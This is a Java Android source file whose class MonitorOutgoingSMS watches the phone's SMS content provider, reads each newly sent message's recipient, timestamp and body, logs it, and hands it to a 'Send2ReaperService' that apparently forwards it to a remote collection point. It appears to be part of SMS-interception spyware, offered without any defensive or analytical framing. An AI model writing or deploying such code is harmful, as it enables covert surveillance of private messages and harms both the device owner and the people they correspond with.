package com.bigeye.crasher;

import java.sql.Date;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class MonitorOutgoingSMS extends Activity {

	public String APP_TAG = "OutgoingSMSService";
	
	ContentResolver contentResolver;
	ContentObserver smsContentObserver;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_crasher);
		
		contentResolver = getContentResolver();
	}
	
	@Override
	protected void onResume(){
		super.onResume();
		
		smsContentObserver = new ContentObserver(new Handler()) {
			@Override
			public void onChange(boolean selfChange){
				Uri smsURI = Uri.parse("content://sms/sent");
				Cursor c = getContentResolver().query(smsURI,
					new String[]{"address","date_sent","body"}, null,null,null);
				
				String[] columns = new String[]{"address","date_sent","body"};
				
				//nav to 1st row, most recently sent
				c.moveToNext();
				
				String dest = c.getString(c.getColumnIndex(columns[0]));
				String date = c.getString(c.getColumnIndex(columns[1]));
				String smsContent = c.getString(c.getColumnIndex(columns[2]));
				
				String finalText = "sms to :"+dest+": "+smsContent+": "+ (new Date(Integer.getInteger(date)).toLocaleString()); 

				//log text
				Toast.makeText(getApplicationContext(), finalText, Toast.LENGTH_LONG).show();
				Log.i(APP_TAG, finalText);
				
				//send to repo
				Intent SvcIntent = new Intent(getApplicationContext(), Send2ReaperService.class);
				SvcIntent.putExtra("OPERATION", "OUTGOING");
				SvcIntent.putExtra("MSG", finalText);
				startService(SvcIntent);
			}
			
			@Override
			public boolean deliverSelfNotifications(){
				return true;
			}
		};
		
		contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsContentObserver);
		
	}
	
	@Override
	protected void onDestroy(){
		super.onDestroy();
		contentResolver.unregisterContentObserver(smsContentObserver);
	}
}
